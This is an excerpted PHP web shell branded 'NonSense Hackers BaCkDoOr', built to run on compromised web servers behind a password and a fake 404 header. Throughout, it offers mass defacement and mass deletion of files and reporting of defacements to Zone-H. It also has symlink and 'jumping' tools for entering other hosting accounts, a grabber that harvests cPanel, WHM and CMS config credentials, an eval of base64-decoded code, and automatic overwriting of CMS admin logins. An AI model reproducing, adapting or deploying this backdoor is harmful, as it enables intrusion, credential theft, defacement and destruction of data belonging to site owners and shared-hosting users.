...
// Copyright: Mr.Z - Cowok Tersakiti Team

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "nonsensehackersid";
$link = "nons.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?NonSense'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
<html>
<head>
	<title>NonSense Hackers BaCkDoOr</title>
<meta charset="UTF-8"> <meta name="Author" content="NonSense" /> <meta name="copyright" content="NonSense" /<meta name="description" content="NonSense Hackers ID" />
</head>
<style>
...
<title>NonSense Hackers ID</title>
<style>
body{
...
text-align: center;
  ...
  resize: none;
  background-color: #000000;
            background-image: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTah8P_Jret7LSa-ChmwLtvIfLmCsvGGIlbtg&usqp=CAU);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
  color: #ffffff;
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">NonSense Hackers ID</font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">Indonesian Hacker Rulez</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">Don't Stop Learning And Make The Exploit</font></b></marquee>
</center>
...
+ Coded By   <td>: <font color='LightBlue'>NonSense<tr><td><font color='white'>
+ Website<td>: <font color='LightBlue'>https://NonSense-Hackers.site<tr><td><font color='white'>
</table>";
...
echo '<font color="green">UPLOAD SUCCESS SIR !!!</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED BITCH !!!")</script></font><br/>';
}
}
...
echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>Cpanel Reset</a>";
echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=zone-h'>Zone-H Notifier</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>Jumping</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=symlink'>Symlink</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=mass-deface'>Mass Deface</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=mass-delete'>Mass Delete</a><br>";
echo "<a class='destroy_table' href='?dir=$dir&to=config'>Get Config</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>Auto Change U&P</a>";
...
if($_GET['to'] == 'zone-h') {
	if($_POST['submit']) {
		...
		echo "Archived: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		...
		foreach($domain as $url) {
			...
			if(preg_match("/color=\"red\">OK!<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=white>OK!</font><br>";
			} else {
		...
		<u>Your Nick</u>: <br>
		<input type='text' name='nick' size='50' value='NonSense'><br>
		<u>List Your Deface</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['to'] == 'mass-deface') {
	function nons_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				...
				if($dirb === '.') {
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=white>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = nons_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
	...
	function nons_normal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				...
				if($dirb === '.') {
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=white>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
	...
	if($_POST['start']) {
		if($_POST['tipe_nons'] == 'Expensive') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			nons_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_nons'] == 'Inexpensive') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			nons_normal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Type Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='Inexpensive' checked>Normal<input type='radio' name='tipe_nons' value='Expensive'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='nons.html' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'> Hacked By NonSense</textarea><br>
	<input type='submit' name='start' value='GO MASS!' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'symlink') {
echo '<hr>';
eval(gzinflate(base64_decode('')));
	...
	if(preg_match("/hsphere/", $dir)) {
				...
				while($gets = fgets($f)) {
					...
					if(is_dir($dir_user) === true) {
						...
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
		...
		if($i == 0) { 
			...
			echo "<br>Total Ada ".$i." Di Kamar ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
			...
			foreach($urls as $url) {
				...
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
				...
				foreach($user_jumping[1] as $user_idx_jump) {
					...
					if(is_readable($user_jumping_dir)) {
						...
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=greenRW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>Cab't Take Name Domains</font> )<br>";
							} else {
           ...
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=green>Terhapus</font>] $lokasi<br>";
                       unlink($lokasi);
...
echo "</div>";
   ...
   $idx = mkdir("nons_config", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("nons_config/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
   if($passwd == "" || !$etc) {
   ...
   $user_config_dir = "/home/$user_nons/public_html/";
   if(is_readable($user_config_dir)) {
   $grab_config = array(
   "/home/$user_nons/.my.cnf" => "cpanel",
   "/home/$user_nons/.accesshash" => "WHM-accesshash",
   "/home/$user_nons/public_html/vdo_config.php" => "Voodoo",
   "/home/$user_nons/public_html/bw-configs/config.ini" => "BosWeb",
   "/home/$user_nons/public_html/config/koneksi.php" => "Lokomedia",
   "/home/$user_nons/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
   "/home/$user_nons/public_html/clientarea/configuration.php" => "WHMCS",
   "/home/$user_nons/public_html/whm/configuration.php" => "WHMCS",
   "/home/$user_nons/public_html/whmcs/configuration.php" => "WHMCS",
   "/home/$user_nons/public_html/forum/config.php" => "phpBB",
   "/home/$user_nons/public_html/sites/default/settings.php" => "Drupal",
   "/home/$user_nons/public_html/config/settings.inc.php" => "PrestaShop",
   "/home/$user_nons/public_html/app/etc/local.xml" => "Magento",
   "/home/$user_nons/public_html/joomla/configuration.php" => "Joomla",
   "/home/$user_nons/public_html/configuration.php" => "Joomla",
   "/home/$user_nons/public_html/wp/wp-config.php" => "WordPress",
   "/home/$user_nons/public_html/wordpress/wp-config.php" => "WordPress",
   "/home/$user_nons/public_html/wp-config.php" => "WordPress",
   "/home/$user_nons/public_html/admin/config.php" => "OpenCart",
   "/home/$user_nons/public_html/slconfig.php" => "Sitelok",
   "/home/$user_nons/public_html/application/config/database.php" => "Ellislab");
   foreach($grab_config as $config => $nama_config) {
   $ambil_config = file_get_contents($config);
   if($ambil_config == '') {
   } else {	
   $file_config = fopen("nons_config/$user_nons-$nama_config.txt","w");
   ...
   echo "<center><a href='?path=$path/nons_config'><font color=green>Selesai!</font></a></center>";
 
 } elseif($_GET['do'] == 'auto-change-user') {
 if($_POST['go']) {
 if(strlen($_POST['password_new']) < 6 OR strlen($_POST['user_new']) < 6) {
 echo "Username Or Password Must Be More Than 6 Character";
 } else {
 ...
 $update = mysql_query("UPDATE $prefix SET username='$user_new',password='$password_new' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Joomla<br>";
 if($site == '') {
 echo "Sitename => <font color=red>error, can't take name a domains</font><br>";
 } else {
 ...
 echo "Status => <font color=gren>success edit user, go login use username & password new</font><br><br>";
 }
 mysql_close($conn);
 ...
 if($target == '') {
 $url_target = "Login => <font color=red>error, can't take name a domains</font><br>";
 } else {
 $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
 }
 $update = mysql_query("UPDATE $prefix SET user_login='$user_new',user_pass='$password_new' WHERE id='$id'");
 echo "Config => ".$file_conf."<br>";
 ...
 echo "Status => <font color=green>success edit user, go login use username & password new</font><br><br>";
 }
 mysql_close($conn);
 ...
 $update = mysql_query("UPDATE $prefix SET username='$user_new',password='$password_new' WHERE user_id='$id'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Magento<br>";
 echo $url_target;
 if(!$update OR !$conn OR !$db) {
 ...
 if($target == '') {
 $target2 = $result[url];
 $url_target = "Login => <font color=red>error, can't take name a domaons</font><br>";
 if($target2 == '') {
 $url_target2 = "Login => <font color=red>error, can't take name a domains</font><br>";
 } else {
 ...
 $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>sorry i don't know where admin login:(</font> ]<br>";
 }
 }
 } else {
 ...
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>sorry i don't know where admin login:(</font> ]<br>";
 }
 }
 $update = mysql_query("UPDATE $prefix SET username='$user_new',password='$password_new' WHERE level='admin'");
 echo "Config => ".$file_conf."<br>";
 echo "CMS => Lokomedia<br>";
 if(preg_match('/error, can't take name a domains/', $url_target)) {
 echo $url_target2;
 } else {
 echo $url_target;
 }
 ...
 echo "Status => <font color=greem>success edit user, go login use username & password new</font><br><br>";
 }
 mysql_close($conn);
 }
 }
 ...
 Set Your User & Pass: <br>
 <input type='text' name='user_new' value='nonsense' placeholder='user_new'><br>
 <input type='text' name='password_new' value='indonesian' placeholder='password_new'><br>
 <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
 </form>
 <span>Note: This tool will work if run in a folder <u>config</u> ( ex: /home/user/public_html/folder_config )</span><br>
 ";
 }
 ...
 echo '<table>';
 echo 'Enter the text you want to encrypt: ';
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <p style='color: white;'>Nick: NonSense | Hackers From: Indonesian</p>
   </center>
   </td>
   </tr>
   <?php
...
echo '<font color="green">CANGE PERM SUCCESS !!!!!</font><br/>';
echo "[ <a href='?path=$path'>back</a> ]";
}else{
echo '<script> alert("CANGE PERM FAIL BRO !!!!!")</font><br />';
}
}
echo '<form method="POST">
...
echo '<script> alert("RENAME FAIL !!!!!")</script><br />';
}
...
echo '<font color="green">EDIT SUCCESS<br/>';
echo "[ <a href='?path=$path'>Back</a> ]";
}else{
echo '<script> alert("EDIT FAIL !!!!!")</script></font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
...
echo '<font color="red">Directory Failed To Delete Sir                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<script> alert("SUCCESS !!!!!")</script><br/>';
}else{
echo '<font color="red">File Failed Delete Sir</font><br/>';
}
}
}
echo '</center>';
